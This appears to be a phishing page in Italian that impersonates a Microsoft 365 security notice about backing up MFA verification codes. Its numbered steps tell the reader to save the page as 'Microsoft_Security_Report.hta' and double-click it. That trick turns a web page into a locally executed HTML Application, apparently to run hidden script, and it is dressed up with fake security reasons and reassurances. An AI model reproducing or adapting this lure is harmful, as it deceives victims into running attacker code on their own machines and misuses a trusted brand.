Microsoft 365 Security Backup MFA

Backup dei codici di verifica MFA

Gentile Amministratore,

per completare la procedura di backup dei codici di verifica a due fattori associati al tuo account, è necessario salvare una copia locale del report di sicurezza MFA. Il portale ha rilevato che il download automatico è stato bloccato dal criterio di sicurezza del browser.

⚠️ Download automatico non disponibile.
Per motivi di sicurezza, il file deve essere salvato manualmente tramite la procedura guidata sottostante. L'operazione richiede meno di un minuto.
Segui i passaggi:
  1. Premi Ctrl + S sulla tastiera per aprire la finestra "Salva con nome".
  2. Nel campo Tipo, seleziona Pagina web, completa.
  3. Nel campo Nome file, sostituisci il nome con: Microsoft_Security_Report.hta
  4. Clicca Salva e attendi il completamento.
  5. Apri il file appena salvato con un doppio clic per completare il backup.

Il file contiene i codici di ripristino cifrati. Conservalo in un luogo sicuro e non condividerlo con nessuno. Se non hai richiesto questa operazione, ignora questo messaggio e contatta il supporto.
